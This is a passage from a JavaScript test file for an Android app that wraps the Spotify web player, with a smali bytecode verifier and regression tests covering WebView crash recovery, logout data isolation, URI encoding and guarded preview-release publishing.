                checkRef(parseReg(arrTok, nLocals));
                checkPrim(parseReg(idxTok, nLocals));
            } else if (op.startsWith('iget')) {
                const [dTok, objTok] = rest.split(',').map((x) => x.trim());
                checkRef(parseReg(objTok, nLocals));
                if (op === 'iget-wide') writeWide(st, parseReg(dTok, nLocals));
                else writeSingle(st, parseReg(dTok, nLocals), op === 'iget-object' ? REF : PRIM);
            } else if (op.startsWith('iput')) {
                const [vTok, objTok] = rest.split(',').map((x) => x.trim());
                if (op === 'iput-wide') checkWide(parseReg(vTok, nLocals));
                else if (op === 'iput-object') checkRef(parseReg(vTok, nLocals));
                else checkPrim(parseReg(vTok, nLocals));
                checkRef(parseReg(objTok, nLocals));
            } else if (op.startsWith('sget')) {
                const [dTok] = rest.split(',').map((x) => x.trim());
                if (op === 'sget-wide') writeWide(st, parseReg(dTok, nLocals));
                else writeSingle(st, parseReg(dTok, nLocals), op === 'sget-object' ? REF : PRIM);
            } else if (op.startsWith('sput')) {
                const [vTok] = rest.split(',').map((x) => x.trim());
                if (op === 'sput-wide') checkWide(parseReg(vTok, nLocals));
                else if (op === 'sput-object') checkRef(parseReg(vTok, nLocals));
                else checkPrim(parseReg(vTok, nLocals));
            } else if (op.startsWith('invoke-')) {
                const im = rest.match(/^\{([^}]*)\},\s*(.+)$/);
                if (im && !op.startsWith('invoke-polymorphic') && !op.startsWith('invoke-custom')) {
                    const regs = expandRegList(im[1], nLocals);
                    const hasRecv = !op.startsWith('invoke-static');
                    const expected = descSlots(im[2], hasRecv);
                    if (!regs || regs.length !== expected.length) {
                        flagConflict(pc, lineNo, s, `invoke arg count mismatch (got ${regs ? regs.length : 'invalid'}, expected ${expected.length})`);
                    } else {
                        for (let i = 0; i < expected.length; i++) {
                            if (expected[i] === REF) checkRef(regs[i]);
                            else if (expected[i] === PRIM) checkPrim(regs[i]);
                            else if (expected[i] === WIDE_LO) { checkWide(regs[i]); i++; }
                        }
                    }
                }
            } else if (op === 'cmpl-float' || op === 'cmpg-float') {
                const [dTok, aTok, bTok] = rest.split(',').map((x) => x.trim());
                checkPrim(parseReg(aTok, nLocals));
                checkPrim(parseReg(bTok, nLocals));
                writeSingle(st, parseReg(dTok, nLocals), PRIM);
            } else if (op === 'cmpl-double' || op === 'cmpg-double' || op === 'cmp-long') {
                const [dTok, aTok, bTok] = rest.split(',').map((x) => x.trim());
                checkWide(parseReg(aTok, nLocals));
                checkWide(parseReg(bTok, nLocals));
                writeSingle(st, parseReg(dTok, nLocals), PRIM);
            } else if (/^[a-z]+-to-[a-z]+$/.test(op)) {
                const [srcKind, dstKind] = op.split('-to-');
                const [dTok, sTok] = rest.split(',').map((x) => x.trim());
                if (srcKind === 'long' || srcKind === 'double') checkWide(parseReg(sTok, nLocals));
                else checkPrim(parseReg(sTok, nLocals));
                if (dstKind === 'long' || dstKind === 'double') writeWide(st, parseReg(dTok, nLocals));
                else writeSingle(st, parseReg(dTok, nLocals), PRIM);
            } else if (/^(?:neg|not)-(?:int|long|float|double)$/.test(op)) {
                const [dTok, sTok] = rest.split(',').map((x) => x.trim());
                const wide = op.endsWith('-long') || op.endsWith('-double');
                if (wide) { checkWide(parseReg(sTok, nLocals)); writeWide(st, parseReg(dTok, nLocals)); }
                else { checkPrim(parseReg(sTok, nLocals)); writeSingle(st, parseReg(dTok, nLocals), PRIM); }
            } else if (op === 'rsub-int' || op === 'rsub-int/lit8') {
                const parts = rest.split(',').map((x) => x.trim());
                checkPrim(parseReg(parts[1], nLocals));
                writeSingle(st, parseReg(parts[0], nLocals), PRIM);
            } else if (/^(?:add|sub|mul|div|rem|and|or|xor|shl|shr|ushr)-(?:int|long|float|double)(?:\/2addr|\/lit8|\/lit16)?$/.test(op)) {
                const parts = rest.split(',').map((x) => x.trim());
                const wide = /-long|-double/.test(op);
                const shift = /^(?:shl|shr|ushr)-long/.test(op);
                if (op.endsWith('/2addr')) {
                    if (wide) {
                        checkWide(parseReg(parts[0], nLocals));
                        if (shift) checkPrim(parseReg(parts[1], nLocals));
                        else checkWide(parseReg(parts[1], nLocals));
                        writeWide(st, parseReg(parts[0], nLocals));
                    } else {
                        checkPrim(parseReg(parts[0], nLocals));
                        checkPrim(parseReg(parts[1], nLocals));
                        writeSingle(st, parseReg(parts[0], nLocals), PRIM);
                    }
                } else if (op.endsWith('/lit8') || op.endsWith('/lit16')) {
                    checkPrim(parseReg(parts[1], nLocals));
                    writeSingle(st, parseReg(parts[0], nLocals), PRIM);
                } else if (wide) {
                    checkWide(parseReg(parts[1], nLocals));
                    if (shift) checkPrim(parseReg(parts[2], nLocals));
                    else checkWide(parseReg(parts[2], nLocals));
                    writeWide(st, parseReg(parts[0], nLocals));
                } else {
                    checkPrim(parseReg(parts[1], nLocals));
                    checkPrim(parseReg(parts[2], nLocals));
                    writeSingle(st, parseReg(parts[0], nLocals), PRIM);
                }
            }

            if (fallthrough) {
                if (pc + 1 < insns.length) mergeInto(pc + 1, st);
                else flagConflict(pc, lineNo, s, 'method falls off end without return/goto/throw');
            }
        }
    }

    for (let idx = 0; idx < lines.length; idx++) {
        const s = lines[idx].trim();
        if (!inMethod) {
            if (s === '# static fields') fieldSection = 'static';
            else if (s === '# instance fields') fieldSection = 'instance';
            else if (s.startsWith('# ')) fieldSection = null;
            else if (s.startsWith('.field ') && fieldSection) {
                const hasStatic = /\bstatic\b/.test(s);
                if (fieldSection === 'instance' && hasStatic) {
                    bugs.push(`STATIC_FIELD_IN_INSTANCE_SECTION ${rel}:${idx + 1} -> ${s}`);
                } else if (fieldSection === 'static' && !hasStatic) {
                    bugs.push(`INSTANCE_FIELD_IN_STATIC_SECTION ${rel}:${idx + 1} -> ${s}`);
                }
            }
        }
        if (s.startsWith('.method ')) {
            inMethod = true;
            sig = s;
            isStatic = /\bstatic\b/.test(s);
            nLocals = null;
            body = [];
        } else if (s === '.end method') {
            verifyMethod();
            inMethod = false;
        } else if (inMethod) {
            const lm = s.match(/^\.locals\s+(\d+)$/);
            if (lm) {
                nLocals = Number(lm[1]);
                continue;
            }
            if (s) body.push([idx + 1, s]);
        }
    }
    return bugs;
}

test('[D7] Full CFG + Dalvik type-lattice verifier checks all smali/ files with zero false positives and catches synthetic VerifyError mutations', () => {
    function walkSmali(dir, acc = []) {
        for (const ent of fs.readdirSync(dir, { withFileTypes: true })) {
            const full = path.join(dir, ent.name);
            if (ent.isDirectory()) walkSmali(full, acc);
            else if (ent.name.endsWith('.smali')) acc.push(full);
        }
        return acc;
    }

    const bugs = [];
    for (const file of walkSmali(path.join(ROOT, 'smali'))) {
        const rel = path.relative(ROOT, file);
        bugs.push(...verifySmaliSource(rel, fs.readFileSync(file, 'utf8')));
    }
    assert.deepEqual(bugs, [], `Dalvik CFG/type-lattice verifier found defects:\n${bugs.join('\n')}`);

    // Anti-false-negative self-tests on arbitrary class/method names (no MainActivity hardcoding!)
    assert.ok(
        verifySmaliSource('synthetic/ArbitraryFoo.smali', [
            '# instance fields',
            '.field public static badStatic:I',
        ].join('\n')).some((b) => b.includes('STATIC_FIELD_IN_INSTANCE_SECTION')),
        'Verifier must detect static fields placed inside # instance fields on any class'
    );
    assert.ok(
        verifySmaliSource('synthetic/ArbitraryBar.smali', [
            '.method public anyMethod(Z)V',
            '    .locals 2',
            '    if-eqz p1, :else_branch',
            '    const/4 p0, 0x1',
            '    goto :join_here',
            '    :else_branch',
            '    :join_here',
            '    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;',
            '    if-ne v0, p0, :done',
            '    :done',
            '    return-void',
            '.end method',
        ].join('\n')).some((b) => b.includes('TYPE_VERIFY_ERROR')),
        'Verifier must detect REF vs PRIM merge Conflict on p0 across CFG branch joins in any method'
    );
    assert.ok(
        verifySmaliSource('synthetic/HalfWideClobber.smali', [
            '.method public static badWide()J',
            '    .locals 2',
            '    const-wide/16 v0, 0x5',
            '    const/4 v1, 0x0',
            '    return-wide v0',
            '.end method',
        ].join('\n')).some((b) => b.includes('TYPE_VERIFY_ERROR')),
        'Verifier must detect clobbering high half of a 64-bit register pair before wide read'
    );
    assert.ok(
        verifySmaliSource('synthetic/UninitRead.smali', [
            '.method public static readUninit(Z)Ljava/lang/Object;',
            '    .locals 1',
            '    if-eqz p0, :skip_init',
            '    const-string v0, "ok"',
            '    :skip_init',
            '    return-object v0',
            '.end method',
        ].join('\n')).some((b) => b.includes('TYPE_VERIFY_ERROR')),
        'Verifier must detect reading a register left uninitialized on one CFG path'
    );
    // Polymorphic const/4 0x0 (null vs int) MUST NOT false-positive!
    assert.deepEqual(
        verifySmaliSource('synthetic/ValidZeroNull.smali', [
            '.method public static polymorphicZero(Z)Ljava/lang/String;',
            '    .locals 1',
            '    const/4 v0, 0x0',
            '    if-eqz p0, :ret_null',
            '    const-string v0, "hello"',
            '    :ret_null',
            '    return-object v0',
            '.end method',
        ].join('\n')),
        [],
        'Verifier must treat const/4 0x0 as polymorphic ZERO (null compatible with REF and PRIM) without false positives'
    );
});

test('[D5] RuntimeDiagnostic and StartupLoadWatchdog guard AlertDialog.show against destroyed activities', () => {
    const diag = readRepoFile('smali/com/melodix/music/RuntimeDiagnostic.smali');
    const watchdog = readRepoFile('smali/com/melodix/music/StartupLoadWatchdog.smali');

    assert.match(diag, /Landroid\/app\/Activity;->isDestroyed\(\)Z/, 'RuntimeDiagnostic must check Activity.isDestroyed()');
    assert.match(diag, /\.catch Ljava\/lang\/Throwable; \{:try_start_dialog[\s\S]*?:catch_dialog/, 'RuntimeDiagnostic.showDialog must catch BadTokenException around AlertDialog.show()');
    assert.match(watchdog, /Landroid\/app\/Activity;->isDestroyed\(\)Z/, 'StartupLoadWatchdog must check Activity.isDestroyed()');
});

test('[D6] preview-apk.yml verifies before publishing unique test pre-releases without ever overwriting existing tags or releases', () => {
    const workflow = readRepoFile('.github/workflows/preview-apk.yml');
    const publishBlock = workflow.slice(workflow.indexOf('- name: Create preview release and attach APK'));
    assert.ok(publishBlock.length > 0, 'Publish side-by-side preview release step must exist');
    assert.match(workflow, /uses: \.\/\.github\/workflows\/test-preview-emulator\.yml/);
    assert.match(publishBlock, /prerelease:\s*true/, 'Must publish strictly as test pre-release');
    assert.match(publishBlock, /overwrite_files:\s*false/, 'Must never overwrite existing release files');
    // 2026-10-24 contract (user-authorized): retired test tags are never
    // recreated, and publication needs an explicit authorization either from
    // a manual dispatch (publish_release=true) or from a push whose commit
    // message carries the [preview-release] marker (the sandbox token cannot
    // create workflow_dispatch events). Ordinary pushes never publish.
    assert.match(workflow, /is retired and must never be recreated or overwritten/);
    assert.match(workflow, /already exists on GitHub Releases; refusing to overwrite/);
    assert.match(
        workflow,
        /needs\.build-and-release-preview\.outputs\.should_publish == 'true' && \(\(github\.event_name == 'workflow_dispatch' && inputs\.publish_release == true\) \|\| \(github\.event_name == 'push' && contains\(github\.event\.head_commit\.message, '\[preview-release\]'\)\)\)/,
        'Publication must require dispatch publish_release=true or the explicit [preview-release] commit marker'
    );
    assert.match(workflow, /default: false/, 'publish_release must default to false');
});

test('[D8] Post-logout WebView teardown avoids shared renderer SIGKILL loop, WebService.onDestroy always cleans receivers/threads, and notification metadata is scrubbed on logout', () => {
    const m9 = readRepoFile('smali/m9.smali');
    const m9bStart = m9.indexOf('.method public static b()V');
    const m9bBody = m9.slice(m9bStart, m9.indexOf('.end method', m9bStart));
    assert.doesNotMatch(
        m9bBody,
        /WEB_VIEW_RENDERER_TERMINATE|Le1;->s\(Landroid\/webkit\/WebViewRenderProcess;\)Z|WebViewRendererBoundaryInterface;->terminate\(\)Z/,
        'Lm9.b() must tear down WebView cleanly without killing the shared WebView renderer process'
    );
    assert.match(m9bBody, /Landroid\/webkit\/WebView;->destroy\(\)V/, 'Lm9.b() must still destroy the WebView instance');

    const c91 = readRepoFile('smali/c91.smali');
    const rpgStart = c91.indexOf('.method public onRenderProcessGone(Landroid/webkit/WebView;Landroid/webkit/RenderProcessGoneDetail;)Z');
    const rpgBody = c91.slice(rpgStart, c91.indexOf('.end method', rpgStart));
    assert.match(
        rpgBody,
        /sget-object\s+v0,\s*Lcom\/melodix\/music\/AppSingleton;->w:Ll9;[\s\S]*?if-ne\s+p1,\s*v0,\s*:/,
        'c91.onRenderProcessGone must ignore stale/detached WebViews while returning true so AwBrowserTerminator never aborts the process'
    );

    const ws = readRepoFile('smali/com/melodix/music/WebService.smali');
    const onDestroyStart = ws.indexOf('.method public final onDestroy()V');
    const onDestroyBody = ws.slice(onDestroyStart, ws.indexOf('.end method', onDestroyStart));
    assert.doesNotMatch(
        onDestroyBody,
        /Landroid\/app\/Activity;->isFinishing\(\)Z/,
        'WebService.onDestroy() must not return early before WebService.l() when MainActivity is open'
    );
    assert.match(
        onDestroyBody,
        /Lcom\/melodix\/music\/WebService;->l\(\)V/,
        'WebService.onDestroy() must always call WebService.l() to unregister receivers and quit AudioDeviceCallbackThread'
    );

    const lStart = ws.indexOf('.method public final l()V');
    const lBody = ws.slice(lStart, ws.indexOf('.end method', lStart));
    assert.match(lBody, /sput-object\s+\w+,\s*Lcom\/melodix\/music\/WebService;->v:Ljava\/lang\/String;/, 'WebService.l() must scrub static track title');
    assert.match(lBody, /sput-object\s+\w+,\s*Lcom\/melodix\/music\/WebService;->u:Ljava\/lang\/String;/, 'WebService.l() must scrub static artist name');
});

test('[R2] Second-pass review regressions: background WebView crash recovery, idempotent WebService cleanup, HTTP/2 response Headers safety, unencoded % search URIs, and cross-recreation logout fencing', async () => {
    // 1. Point #2: onRenderProcessGone recovers WebService background WebView when MainActivity is destroyed/absent
    const c91 = readRepoFile('smali/c91.smali');
    const rpgBody = extractSmaliMethod(
        c91,
        '.method public onRenderProcessGone(Landroid/webkit/WebView;Landroid/webkit/RenderProcessGoneDetail;)Z'
    );
    assert.match(
        rpgBody,
        /Lcom\/melodix\/music\/WebService;->G:Lcom\/melodix\/music\/WebService;[\s\S]*?Lyi1;-><init>\(Lcom\/melodix\/music\/WebService;I\)V/,
        'onRenderProcessGone must fall back to recreating WebService WebView via Lyi1(WebService.G, 1) when MainActivity is absent/destroyed'
    );

    // 2. Point #3: WebService.l() is strictly idempotent across STOP_SERVICE -> stopSelf() -> onDestroy() -> l(),
    //    clears field m (AudioDeviceCallback), clears pending MediaBrowser Result maps E & F, and Lyi1 avoids destroyed Service context
    const ws = readRepoFile('smali/com/melodix/music/WebService.smali');
    assert.match(ws, /\.field private cleanedUp:Z/, 'WebService must guard l() against double-execution between STOP_SERVICE and onDestroy()');
    const lBody = extractSmaliMethod(ws, '.method public final l()V');
    assert.match(lBody, /iput-object\s+\w+,\s*p0,\s*Lcom\/melodix\/music\/WebService;->m:Lbj1;/, 'WebService.l() must null out AudioDeviceCallback field m');
    const lAndDrain = lBody + '\n' + extractSmaliMethod(ws, '.method public static completeAndClearPendingResults()V');
    assert.match(lAndDrain, /Lcom\/melodix\/music\/WebService;->E:Ljava\/util\/concurrent\/ConcurrentHashMap;/, 'WebService.l() must purge pending MediaBrowser browse results E');
    assert.match(lAndDrain, /Lcom\/melodix\/music\/WebService;->F:Ljava\/util\/concurrent\/ConcurrentHashMap;/, 'WebService.l() must purge pending MediaBrowser search results F');
    const yi1 = readRepoFile('smali/yi1.smali');
    assert.match(yi1, /getApplicationContext\(\)Landroid\/content\/Context;/, 'Lyi1 delayed cleanup must use ApplicationContext rather than a destroyed Service instance');

    // 3. Point #4 & #5: spotify_bridge.js safely handles unencoded '%' in spotify:search: URIs AND invalid HTTP/2 pseudo-headers in Headers
    let searchedQuery = null;
    const StrictHeaders = class extends MockHeaders {
        set(k, v) {
            if (!/^[!#$%&'*+.^_`|~0-9A-Za-z-]+$/.test(String(k))) {
                throw new TypeError(`Invalid header name: ${k}`);
            }
            super.set(k, v);
        }
        append(k, v) {
            this.set(k, v);
        }
    };
    const { sandbox } = createBridgeVm({
        nativeFetchImpl() {
            return JSON.stringify({
                status: 200,
                headers: { ':status': '200', 'content-type': 'application/json' },
                body: '{"ok":true}',
            });
        },
    });
    sandbox.Headers = StrictHeaders;
    sandbox.openSearch = (q) => { searchedQuery = q; };
    assert.doesNotThrow(() => sandbox.playFromUri('spotify:search:100% Pure Love'));
    assert.equal(searchedQuery, '100% Pure Love');

    const res = await sandbox.fetch('https://gew4-spclient.spotify.com/connect-state/v1/devices/hobs_1', { method: 'GET' });
    assert.equal(res.ok, true);
    assert.equal(res.headers.get('content-type'), 'application/json');
    assert.equal(typeof res.blob, 'function');

    // 4. Point #6: Delayed setTimeout player sync, profile avatar/greeting sync, ValueCallbacks, AndBridge instance epoch,
    //    static process-wide nativeSessionEpoch, and MainActivity recreation lifecycle preserve strict Account A isolation
    const mainSmali = readRepoFile('smali/com/melodix/music/MainActivity.smali');
    assert.match(
        mainSmali,
        /\.field public static nativeSessionEpoch:I/,
        'nativeSessionEpoch must be static monotonic so Activity recreation never resets epoch to 0'
    );
    const onDestroy = extractSmaliMethod(mainSmali, '.method public final onDestroy()V');
    assert.match(
        onDestroy,
        /if-ne\s+\w+,\s*p0,\s*:/,
        'MainActivity.onDestroy must only clear AppSingleton.t when AppSingleton.t still points to the destroyed instance'
    );
    const bridgeSmali = readRepoFile('smali/com/melodix/music/AndBridge.smali');
    assert.match(bridgeSmali, /\.field private final bridgeEpoch:I/, 'AndBridge must capture bridgeEpoch on creation to reject stale background JS threads across logout/recreation');
    for (const cbRel of [
        'smali/com/melodix/music/NativeHomeJsonCallback.smali',
        'smali/com/melodix/music/NativeListJsCallback.smali',
    ]) {
        assert.match(readRepoFile(cbRel), /nativeSessionEpoch:I/, `${cbRel} must reject pre-logout evaluateJavascript callbacks`);
    }

    // Prove untracked setTimeout inside refreshPlayerSoon cannot leak Account A track/greeting/avatar after logout
    const pendingTimeouts = [];
    const emittedAfterLogout = [];
    const uiDoc = {
        hidden: false,
        title: 'Secret Song Account A - Spotify',
        body: { innerText: '' },
        documentElement: {
            dataset: {},
            classList: { add() {}, remove() {}, contains: () => false },
            style: { setProperty() {} },
        },
        querySelector(sel) {
            if (sel === '[data-testid="context-item-info-title"]') return { textContent: 'Secret Song Account A' };
            if (sel === '[data-testid="context-item-info-subtitles"]') return { textContent: 'Private Artist A' };
            if (sel.includes('user-widget-link')) {
                return {
                    getAttribute: (n) => (n === 'aria-label' ? 'Alice Secret' : ''),
                    querySelector: (q) => (q === 'img' ? { src: 'https://i.scdn.co/image/alice_avatar' } : null),
                };
            }
            return null;
        },
        querySelectorAll: () => [],
        getElementById: () => null,
        createElement: () => ({ style: {}, setAttribute() {}, appendChild() {}, remove() {} }),
        head: { appendChild() {} },
        addEventListener() {},
        removeEventListener() {},
    };
    const uiBox = {
        console: { log() {}, warn() {}, error() {}, info() {} },
        URL,
        MutationObserver: function MutationObserver() { this.observe = () => {}; this.disconnect = () => {}; },
        navigator: { userAgent: 'Mozilla/5.0' },
        location: {
            href: 'https://open.spotify.com/',
            origin: 'https://open.spotify.com',
            hostname: 'open.spotify.com',
            pathname: '/',
            search: '',
            assign() {},
        },
        history: { back() {}, pushState() {}, replaceState() {} },
        localStorage: { clear() {}, getItem: () => null, setItem() {}, removeItem() {} },
        sessionStorage: { clear() {}, getItem: () => null, setItem() {}, removeItem() {} },
        document: uiDoc,
        Node: { ELEMENT_NODE: 1 },
        setTimeout: (fn) => {
            const h = { fn, cleared: false };
            pendingTimeouts.push(h);
            return h;
        },
        clearTimeout: (h) => { if (h) h.cleared = true; },
        setInterval: (fn) => ({ fn, cleared: false }),
        clearInterval: () => {},
        AndBridge: {
            onNativeUiData(type, payload) { emittedAfterLogout.push({ kind: 'data', type, payload }); },
            onNativeProfileImage(url) { emittedAfterLogout.push({ kind: 'avatar', url }); },
            onNativeUiReady() { emittedAfterLogout.push({ kind: 'ready' }); },
            onNativeUiRoute(r) { emittedAfterLogout.push({ kind: 'route', r }); },
            nativeLogout() {},
            logBridgeError() {},
        },
    };
    uiBox.window = uiBox;
    uiBox.self = uiBox;
    uiBox.globalThis = uiBox;
    vm.runInNewContext(readRepoFile('assets/native_ui_shell.js'), uiBox, { filename: 'assets/native_ui_shell.js' });

    // Queue an untracked 400ms player refresh BEFORE logout, then logout, then fire ALL un-cancelled timeouts + __sfNativeUiRefresh
    uiBox.__sfNativeTogglePlayPause && uiBox.__sfNativeTogglePlayPause();
    uiBox.__sfToggleSpotifySetting('spotify:settings:logout');
    emittedAfterLogout.length = 0;
    for (const t of pendingTimeouts) {
        if (!t.cleared) t.fn();
    }
    if (typeof uiBox.__sfNativeUiRefresh === 'function') uiBox.__sfNativeUiRefresh();
    assert.deepEqual(emittedAfterLogout, [], 'Zero player/avatar/greeting/ready payloads may cross AndBridge after logout');
});

test('[R3] Final targeted audit regressions: foreground/background WebView recovery, completed MediaBrowser Results, full native spotify:search: routing, loadNativeSpotifyUri guard, and standard Response semantics', async () => {
    // 1. Foreground vs Background WebView crash recovery
    const mainSmali = readRepoFile('smali/com/melodix/music/MainActivity.smali');
    const aMethod = extractSmaliMethod(mainSmali, '.method public final A()V');
    const cond0Idx = aMethod.indexOf('\n    :cond_0');
    const resetCallIdx = aMethod.indexOf('resetNativeStateForLogout()V');
    assert.ok(
        resetCallIdx > 0 && resetCallIdx < cond0Idx,
        'MainActivity.A() must invoke resetNativeStateForLogout() inside the explicit logout branch (before :cond_0)'
    );
    assert.match(
        aMethod.slice(cond0Idx),
        /sget-boolean\s+v0,\s*Lcom\/melodix\/music\/AppSingleton;->B:Z[\s\S]*?if-nez\s+v0,\s*:after_logout_reset/,
        'MainActivity.A() must skip resetNativeStateForLogout() when logged-in session recovers from foreground renderer crash (AppSingleton.B == true)'
    );

    const yi1 = readRepoFile('smali/yi1.smali');
    const yi1BgPart = yi1.slice(0, yi1.indexOf(':pswitch_0'));
    assert.match(yi1BgPart, /Landroid\/webkit\/WebView;->resumeTimers\(\)V/, 'Background WebView recreation in Lyi1 must unthrottle timers');
    assert.match(yi1BgPart, /Landroid\/webkit\/WebView;->onResume\(\)V/, 'Background WebView recreation in Lyi1 must resume WebView lifecycle');
    assert.match(yi1BgPart, /dispatchWindowVisibilityChanged\(I\)V/, 'Background WebView recreation in Lyi1 must mark window visibility active');

    const ws = readRepoFile('smali/com/melodix/music/WebService.smali');
    assert.match(ws, /\.field public static resumePlaybackOnRecovery:Z/, 'WebService must track active playback across background renderer crash');
    const c91 = readRepoFile('smali/c91.smali');
    assert.match(c91, /resumePlaybackOnRecovery:Z/, 'Lc91 must save/consume resumePlaybackOnRecovery across crash and page load');

    // 2. Detached MediaBrowserServiceCompat$Result completion + safe quoting in onLoadChildren / onSearch
    assert.match(ws, /\.method public static completeAndClearPendingResults\(\)V/, 'WebService must expose completeAndClearPendingResults()');
    const completeBody = extractSmaliMethod(ws, '.method public static completeAndClearPendingResults()V');
    assert.match(
        completeBody,
        /Landroidx\/media\/MediaBrowserServiceCompat\$Result;->sendResult\(Ljava\/lang\/Object;\)V/,
        'completeAndClearPendingResults must call Result.sendResult(emptyList) so detached MediaBrowser clients never hang'
    );
    assert.match(extractSmaliMethod(ws, '.method public final l()V'), /completeAndClearPendingResults\(\)V/);
    assert.match(extractSmaliMethod(mainSmali, '.method public final resetNativeStateForLogout()V'), /completeAndClearPendingResults\(\)V/);
    const onLoadChildren = extractSmaliMethod(ws, '.method public final onLoadChildren(Ljava/lang/String;Landroidx/media/MediaBrowserServiceCompat$Result;)V');
    const onSearch = extractSmaliMethod(ws, '.method public final onSearch(Ljava/lang/String;Landroid/os/Bundle;Landroidx/media/MediaBrowserServiceCompat$Result;)V');
    assert.match(onLoadChildren, /Lorg\/json\/JSONObject;->quote\(Ljava\/lang\/String;\)Ljava\/lang\/String;/, 'onLoadChildren must JSON-quote parentId');
    assert.match(onSearch, /Lorg\/json\/JSONObject;->quote\(Ljava\/lang\/String;\)Ljava\/lang\/String;/, 'onSearch must JSON-quote search query');

    // 3. loadNativeSpotifyUri URL validation + end-to-end spotify:search: native routing with spaces, apostrophes, colons, accents, and '%'
    const loadUriBody = extractSmaliMethod(mainSmali, '.method public final loadNativeSpotifyUri(Ljava/lang/String;)V');
    assert.match(loadUriBody, /NativeFetchGuard;->parseAllowedUrl/, 'loadNativeSpotifyUri must guard non-spotify URLs via NativeFetchGuard');
    const applyUiBody = extractSmaliMethod(mainSmali, '.method public final applyNativeUiData(Ljava/lang/String;Ljava/lang/String;)V');
    assert.match(applyUiBody, /"open-search"/, 'applyNativeUiData must handle open-search from spotify:search: deep-links');

    const bridgeUiEvents = [];
    let bridgeSearched = null;
    const { sandbox } = createBridgeVm({
        nativeFetchImpl() {
            return JSON.stringify({ status: 204, headers: {}, body: '' });
        },
    });
    sandbox.AndBridge.onNativeUiData = (type, payload) => { bridgeUiEvents.push({ type, payload }); };
    sandbox.searchMediaItems = (q) => { bridgeSearched = q; };
    sandbox.openSearch = () => {};
    sandbox.playFromUri("spotify:search:Daft Punk: Don't Stop 100% Santé");
    assert.equal(bridgeSearched, "Daft Punk: Don't Stop 100% Santé");
    assert.deepEqual(bridgeUiEvents, [{ type: 'open-search', payload: "Daft Punk: Don't Stop 100% Santé" }]);

    // 4. Native shell __sfNativeOpenUri properly encodes spotify:search: with colons, %, and accents
    const assignedUrls = [];
    const shellCtx = {
        console: { log() {}, warn() {}, error() {}, info() {} },
        URL,
        MutationObserver: function MutationObserver() { this.observe = () => {}; this.disconnect = () => {}; },
        navigator: { userAgent: 'Mozilla/5.0' },
        location: {
            href: 'https://open.spotify.com/',
            origin: 'https://open.spotify.com',
            hostname: 'open.spotify.com',
            pathname: '/',
            search: '',
            assign(u) { assignedUrls.push(u); },
        },
        history: { back() {}, pushState() {}, replaceState() {} },
        localStorage: { clear() {}, getItem: () => null, setItem() {}, removeItem() {} },
        sessionStorage: { clear() {}, getItem: () => null, setItem() {}, removeItem() {} },
        document: {
            hidden: false,
            title: 'Spotify',
            body: { innerText: '' },
            documentElement: { dataset: {}, classList: { add() {}, remove() {}, contains: () => false }, style: { setProperty() {} } },
            querySelector: () => null,
            querySelectorAll: () => [],
            getElementById: () => null,
            createElement: () => ({ style: {}, setAttribute() {}, appendChild() {}, remove() {} }),
            head: { appendChild() {} },
            addEventListener() {},
            removeEventListener() {},
        },
        Node: { ELEMENT_NODE: 1 },
        setTimeout: () => 1,
        clearTimeout: () => {},
        setInterval: () => 1,
        clearInterval: () => {},
    };
    shellCtx.window = shellCtx;
    shellCtx.self = shellCtx;
    shellCtx.globalThis = shellCtx;
    vm.runInNewContext(readRepoFile('assets/native_ui_shell.js'), shellCtx, { filename: 'assets/native_ui_shell.js' });
    assert.equal(shellCtx.__sfNativeOpenUri("spotify:search:Daft Punk: Don't Stop 100% Santé"), true);
    assert.deepEqual(assignedUrls, ["https://open.spotify.com/search/Daft%20Punk%3A%20Don't%20Stop%20100%25%20Sant%C3%A9"]);

    // 5. Synthetic Response fidelity: 204 empty body rejects json(), tracks bodyUsed, and preserves independent clone()
    const res204 = await sandbox.fetch('https://gew4-spclient.spotify.com/connect-state/v1/player/command/from/a/to/b', { method: 'POST' });
    assert.equal(res204.ok, true);
    assert.equal(res204.status, 204);
    assert.equal(res204.bodyUsed, false);
    const cloned204 = res204.clone();
    await assert.rejects(() => res204.json(), { name: 'SyntaxError' });
    assert.equal(res204.bodyUsed, true);
    assert.equal(cloned204.bodyUsed, false);
    assert.equal(await cloned204.text(), '');
    assert.equal(cloned204.bodyUsed, true);
});


